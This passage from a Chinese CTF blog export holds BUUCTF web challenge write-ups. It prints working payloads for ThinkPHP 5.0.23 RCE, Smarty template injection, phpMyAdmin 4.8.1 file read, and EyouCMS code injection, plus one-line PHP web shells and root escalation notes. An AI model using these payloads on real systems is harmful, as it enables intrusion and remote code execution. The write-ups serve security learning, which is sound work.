class="number">0x1234567812345678</span>);</span><br><span class="line">&#125;</span><br><span class="line">$s -&gt; rewind();</span><br><span class="line"><span class="keyword">unset</span>($s[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
<p>先用蚁剑连接：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201230191719.png" alt=""></p>
<p>再上传至/tmp目录下：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201230191807.png" alt=""></p>
<p>include包含exp.php</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201230191837.png" alt=""></p>
<h2 id="0x03-penetration">0x03 penetration</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">    $ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    $_=<span class="keyword">array</span>(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\:&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\@&#x27;</span>,<span class="string">&#x27;\&amp;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\%&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\)&#x27;</span>,<span class="string">&#x27;\!&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&#125;&#x27;</span>,<span class="string">&#x27;\&#123;&#x27;</span>,<span class="string">&#x27;\_&#x27;</span>);</span><br><span class="line">    $blacklist = array_merge($_);</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen($ip) &lt;= <span class="number">18</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blacklisted . <span class="string">&#x27;/im&#x27;</span>, $ip)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            exec($ip);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;long&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>过滤之后还剩下这些字符可以使用:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># $ , &#x2F; ; ? \ &#96; | a c h l r s t u v y z 0 1 2 3 4 5 6 7 8 9</span><br></pre></td></tr></table></figure>
<p>由于exec没有回显，应该要使用反弹shell，但是有字数长度限制，这里需要用curl命令读取远程文件绕过一下，而且要把ip地址转换成十进制表示，不知道是我的阿里云站点配置有问题还是怎么回事，我用curl命令+ip地址返回200，但是curl+十进制ip地址就直接给我返回301了，但是我看了宝塔的配置，也没有启用301重定向。</p>
<p>有知道原因的时候师傅可以告知我一下。</p>
<h2 id="0x04-BMZ-Market">0x04 BMZ_Market</h2>
<p>综合渗透类型，有点像HackTheBox。</p>
<p>首先进行信息搜集，查看源代码：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131109.png" alt=""></p>
<p>robots.txt</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131154.png" alt=""></p>
<p>一共搜集到两个地方，参数lang和robots.txt</p>
<p>参数lang存在文件包含漏洞，使用伪协议可以读取源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password =<span class="string">&quot;Nevergiveup135.&quot;</span> ;<span class="comment">//I have to remember it</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;lang&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">&#x27;lang&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;description&quot;</span> content=<span class="string">&quot;BMZ Market&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;author&quot;</span> content=<span class="string">&quot;bmz&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;BMZ Market&lt;/title&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;link href=<span class="string">&quot;bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    &lt;link href=<span class="string">&quot;covers.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body class=&quot;text-center&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&gt;</span><br><span class="line">      &lt;header class=&quot;masthead mb-auto&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">          &lt;h3 class=&quot;masthead-brand&quot;&gt;BMZ Market&lt;/h3&gt;</span><br><span class="line">          &lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&gt;</span><br><span class="line">            &lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&gt;Home&lt;/a&gt;</span><br><span class="line">            &lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;</span><br><span class="line">          &lt;/nav&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/header&gt;</span><br><span class="line"></span><br><span class="line">      &lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&gt;</span><br><span class="line">        &lt;h1 class=&quot;cover-heading&quot;&gt;Coming soon&lt;/h1&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">          <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;lang&#x27;</span>]))</span><br><span class="line">          &#123;</span><br><span class="line">          <span class="keyword">echo</span> $message;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">            Believe in yourself, you can find the flag</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">          &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">          &lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&gt;more&lt;/a&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">      &lt;/main&gt;</span><br><span class="line"></span><br><span class="line">      &lt;footer class=&quot;mastfoot mt-auto&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">          &lt;p&gt;Power by&lt;a href=<span class="string">&quot;#&quot;</span>&gt;@kuaile&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/footer&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>有一个密码硬编码的地方：<code>Nevergiveup135.</code>，用户名可能是kuaile</p>
<p>robots.txt拿去base64 decode：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131506.png" alt=""></p>
<p>发现是颜文字，可以直接拿到浏览器的console界面执行</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131609.png" alt=""></p>
<p>又给了一个信息：<code>Challenger, the background of the website is -.../--/--../.-/-../--/../-.</code></p>
<p>后面是一个摩斯编码，解码后的结果是:<code>BMZADMIN</code>，看样子应该是一个后台管理界面，用上面得到的用户名和密码登录进入后台。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131827.png" alt=""></p>
<p>可以看到当前的CMS版本是1.3.7，Google已知的利用方式：<a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Eyoucms/Eyoucms%201.3.9%20%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">https://wiki.96.mk/Web安全/Eyoucms/Eyoucms 1.3.9 上传漏洞/</a></p>
<p>这种利用方式好像打不通，参考mochu师傅的wp</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103154407.png" alt=""></p>
<p>抓包修改参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;scene&#x3D;bbb\&#39;,$&#123;eval($_POST[mochu7])&#125;,&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103154643.png" alt=""></p>
<p>蚁剑连接，sudo -l发现可以无限制执行root命令：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103155216.png" alt=""></p>
<p>再回头来看看后台上传文件RCE失效的原因：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103155327.png" alt=""></p>
<p>可能是作者把解压的类文件给删掉了。</p>
<p>来大概跟一下这个漏洞，文件位置在application/admin/controllor/Weapp.php</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103165020.png" alt=""></p>
<p>由于过滤不严，直接把payload写到config.php文件当中：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103164941.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103165136.png" alt=""></p>
<p>然后在core/library/think/App.php中包含了config.php</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103170458.png" alt=""></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf刷题——PHP框架漏洞篇</title>
    <url>/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87/</url>
    <content><![CDATA[<h1 id="BUUCTF——PHP框架漏洞篇">BUUCTF——PHP框架漏洞篇</h1>
<h2 id="BJDCTF-2nd-old-hacker">BJDCTF 2nd old-hacker</h2>
<h3 id="考点">考点</h3>
<ul>
<li>ThinkPHP 5.0.23 RCE</li>
</ul>
<h3 id="解题">解题</h3>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?s&#x3D;captcha</span><br><span class="line">POST:_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<h2 id="BJDCTF2020-The-mystery-of-ip">BJDCTF2020 The mystery of ip</h2>
<h3 id="考点-v2">考点</h3>
<ul>
<li>PHP Smarty 模板注入</li>
</ul>
<h3 id="解题-v2">解题</h3>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forward-For: &#123;&#123;system(&quot;ls&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="GKCTF2020-CVE版签到">GKCTF2020 CVE版签到</h2>
<h3 id="考点-v3">考点</h3>
<ul>
<li>cve-2020-7066</li>
</ul>
<h3 id="解题-v3">解题</h3>
<p>首先Google一下cve-2020-7066</p>
<blockquote>
<p>在低于7.2.29的PHP版本7.2.x，低于7.3.16的7.3.x和低于7.4.4的7.4.x中，<strong>将get_headers（）与用户提供的URL一起使用时</strong>，如果URL包含零（\0）字符，则URL将被静默地<strong>截断</strong>。</p>
</blockquote>
<p>demo：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// user input</span></span><br><span class="line">$_GET[<span class="string">&#x27;url&#x27;</span>] = <span class="string">&quot;http://localhost\0.example.com&quot;</span>;</span><br><span class="line"></span><br><span class="line">$host = parse_url($_GET[<span class="string">&#x27;url&#x27;</span>], PHP_URL_HOST);</span><br><span class="line"><span class="keyword">if</span> (substr($host, <span class="number">-12</span>) !== <span class="string">&#x27;.example.com&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$headers = get_headers($_GET[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">var_dump($headers);</span><br></pre></td></tr></table></figure>
<p>在PHP7.1版本下会输出<code>Null</code>，在PHP7.2版本下会输出<code>http://localhost</code></p>
<p>访问首页查看network</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702153335.png" alt=""></p>
<p>结合cve-2020-7066，用<code>http://127.0.0.123%00www.ctfhub.com</code>即可获得flag。</p>
<blockquote>
<p>localhost不是单指127.0.0.1，而是符合127.0.0.0/24这一网段的IP地址，比如127.0.0.100也可以叫localhost</p>
</blockquote>
<h2 id="GYCTF2019-我有一个数据库">GYCTF2019 我有一个数据库</h2>
<h3 id="考点-v4">考点</h3>
<ul>
<li>phpmyadmin 4.8.1 任意文件读取</li>
</ul>
<h3 id="解题-v4">解题</h3>
<p>打开题目提示有一个数据库，访问robots.txt，发现phpinfo.php页面，过一遍之后没有什么可以利用的。（我都不知道为啥要给这个文件，反而把我给带偏了。）</p>
<p>扫一下目录，扫出来了phpmyadmin路径，访问后没有密码直接进入数据库管理页面，除了MySQL自带的两个数据库，确实没有其他的数据库，查看当前phpmyadmin版本是4.8.1，这个版本有一个CVE-2018-12613的公开漏洞，可以任意文件读取。那就直接上payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php&#x2F;?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure>
<h3 id="后记">后记</h3>
<p>知其然更要知其所以然，来复现一下phpmyadmin 4.8.1。</p>
<p>问题就出在第61行的include函数</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702164431.png" alt=""></p>
<p>前提是绕过55-59行的检查。</p>
<p>第55行和第56行都比较容易pass，第57行限制target参数不能以index开头，第58行限制target参数不能有<code>$target_blacklist</code>数组中的关键字，其中<code>$target_blacklist</code>包括<code>import.php</code>和<code>export.php</code>，第59行将target参数传入<code>checkPageValidity</code>进行检查，找到对应的函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;$page, <span class="keyword">array</span> $whitelist = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">            $whitelist = <span class="built_in">self</span>::$goto_whitelist;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = urldecode($page);</span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>要想使该函数返回true，包含的文件必须包含在白名单<code>$goto_whitelist</code>中，</p>
<p>第14行到21行的代码是以<code>?</code>分割然后取出前面的字符串再判断值是否存在与<code>$goto_whilelist</code>某个数组中。</p>
<p>第23行到第31行代码是将<code>$page</code>参数用urlencode解码再进行以<code>?</code>分割取出前面的值做判断。</p>
<p>我把<code>?</code>两次url编码为<code> %253f</code> 即可绕过验证。</p>
<p>那么传入<code>target=db_sql.php%253f/../../etc/passwd</code>，其中<code>%253f</code>是?号的二此url编码urlcode将<code>$page</code>解码后是<code>db_sql.php?/../../etc/passwd</code>  ，再以<code>?</code>分割取出来前面的字符串为<code>db_sql.php</code>，​<code>$goto_whitelist</code>中有<code>db_sql.php</code>所以会进入最后一个if语句并返回true。</p>
<p>利用方式也比较简单，可以执行一下<code>SELECT '&lt;?=phpinfo()?&gt;';</code>，然后查看自己的sessionid（cookie中phpMyAdmin的值），然后包含session文件即可：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702171557.png" alt=""></p>
<h2 id="CISCN2019-华东南赛区-Web11">CISCN2019 华东南赛区 Web11</h2>
<h3 id="考点-v5">考点</h3>
<ul>
<li>smarty SSTI</li>
</ul>
<h3 id="解题-v5">解题</h3>
<p><a href="https://www.jianshu.com/p/eb8d0137a7d3">参考文章</a></p>
<p>页面提示两个API并不能用，但是在右上角还是看到了一个Current IP的显示，而且页脚还说明了这个站点用到了Smarty模板引擎，那么SSTI的注入点应该就是在<code>X-Forward-For</code>请求头。</p>
<p>用<code>&#123;&#123;7*'7'&#125;&#125;</code>测试一下</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712150025.png" alt=""></p>
<p>用网上常见的Smarty SSTI读文件的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712150146.png" alt=""></p>
<p>直接报错。</p>
<blockquote>
<p><strong><a href="http://d.hatena.ne.jp/keyword/Smarty">Smarty</a>的{if}条件判断和<a href="http://d.hatena.ne.jp/keyword/PHP">PHP</a>的if 非常相似，只是增加了一些特性。全部的<a href="http://d.hatena.ne.jp/keyword/PHP">PHP</a>条件表达式和<a href="http://d.hatena.ne.jp/keyword/%C8%A1%BF%F4">函数</a>都可以在if内使用</strong>，如*||*,or,&amp;&amp;,and,is_array(), 等等。</p>
</blockquote>
<p>按照if的这个特性，尝试执行phpinfo()，成功执行。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712150301.png" alt=""></p>
<p>使用system函数可以执行<code>ls</code>命令，但是不能执行读文件的操作。那就直接用<code>show_source</code>函数</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712150445.png" alt=""></p>
<h3 id="拓展">拓展</h3>
<p>不同版本可以利用的方式不同，常用的有以下三种方法：</p>
<p>1.旧版Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令。</p>
<p>Smarty3的官方手册描述：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Smarty已经废弃&#123;php&#125;标签，强烈建议不要使用。在Smarty 3.1，&#123;php&#125;仅在SmartyBC中可用</span><br></pre></td></tr></table></figure>
<p>2.旧版Smarty可以通过self获取Smarty类再调用其静态方法实现文件读写</p>
<p>3.PHP函数都可以在模板中使用，因此注入时，可以直接使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;system(&#39;ls&#39;)&#125;</span><br></pre></td></tr></table></figure>
<p>便可随意执行命令；执行多条语句的话可以使用下面的形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;system(&#39;ls&#39;)&#125;&#123;system(&#39;cat index.php&#39;)&#125;</span><br></pre></td></tr></table></figure>
<p>-----------------分割线</p>
<p><a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5436&amp;page=3">攻防世界</a>上有一道升级版的，限制disable_function以及open_basedir。</p>
<p>但是还是可以直接写shell，用蚁剑连接直接绕过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;file_put_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;,&#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;)&#125;</span><br></pre></td></tr></table></figure>
<h2 id="GYCTF2020-Easy-Thinking">GYCTF2020 Easy Thinking</h2>
<h3 id="考点-v6">考点</h3>
<ul>
<li>ThinkPHP 6.0.0~6.0.2 任意文件上传</li>
</ul>
<h3 id="解题-v6">解题</h3>
<p>随便测试发现用的框架是ThinkPHP6.0，Google一下就可以看到1月份爆出的任意文件上传的漏洞。</p>
<blockquote>
<p><a href="https://paper.seebug.org/1114">https://paper.seebug.org/1114</a></p>
</blockquote>
<p>扫描之后有源码泄露<code>www.zip</code>，下载之后审计一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (Request::isPost())&#123;</span><br><span class="line">           <span class="keyword">if</span> (!session(<span class="string">&#x27;?UID&#x27;</span>))</span><br><span class="line">           &#123;</span><br><span class="line">               <span class="keyword">return</span> redirect(<span class="string">&#x27;/home/member/login&#x27;</span>);            </span><br><span class="line">           &#125;</span><br><span class="line">           $data = input(<span class="string">&quot;post.&quot;</span>);</span><br><span class="line">           $record = session(<span class="string">&quot;Record&quot;</span>);</span><br><span class="line">           <span class="keyword">if</span> (!session(<span class="string">&quot;Record&quot;</span>))</span><br><span class="line">           &#123;</span><br><span class="line">               session(<span class="string">&quot;Record&quot;</span>,$data[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">               $recordArr = explode(<span class="string">&quot;,&quot;</span>,$record);</span><br><span class="line">               $recordLen = sizeof($recordArr);</span><br><span class="line">               <span class="keyword">if</span> ($recordLen &gt;= <span class="number">3</span>)&#123;</span><br><span class="line">                   array_shift($recordArr);</span><br><span class="line">                   session(<span class="string">&quot;Record&quot;</span>,implode(<span class="string">&quot;,&quot;</span>,$recordArr) . <span class="string">&quot;,&quot;</span> . $data[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">                   <span class="keyword">return</span> View::fetch(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line">           session(<span class="string">&quot;Record&quot;</span>,$record . <span class="string">&quot;,&quot;</span> . $data[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">           <span class="keyword">return</span> View::fetch(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">return</span> View(<span class="string">&quot;search&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>发现 search搜索的地方有一个 session 的储存。</p>
<p>先注册一个账号，登录，然后搜索的时候抓包。</p>
<p>thinkphp6 会默认在 /runtime/session 创建一个sess_xxx格式的session文件，这里的xxx就是PHPSESSID（必须是32位），而文件的内容就是session的内容，也就是key的内容。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200723202726.png" alt=""></p>
<p>然后搜索的时候写入shell</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200723202921.png" alt=""></p>
<p>再用蚁剑连接，用插件绕过disable_function。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>框架漏洞</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf刷题——XSS</title>
    <url>/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS/</url>
    <content><![CDATA[<h2 id="CISCN2019-华东北赛区-Web2">[CISCN2019 华东北赛区]Web2</h2>
<h2 id="CISCN2019-华东南赛区-Web9">[CISCN2019 华东南赛区]Web9</h2>
]]></content>
      <categories>
        <category>CTF</category>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf刷题——SSRF</title>
    <url>/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF/</url>
    <content><![CDATA[<h2 id="De1CTF2019-SSRF-Me">De1CTF2019 SSRF Me</h2>
<h3 id="考点">考点</h3>
<ul>
<li>Python代码审计</li>
<li>MD5扩展攻击</li>
</ul>
<h3 id="解题">解题</h3>
<p>首先看三个路由：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, 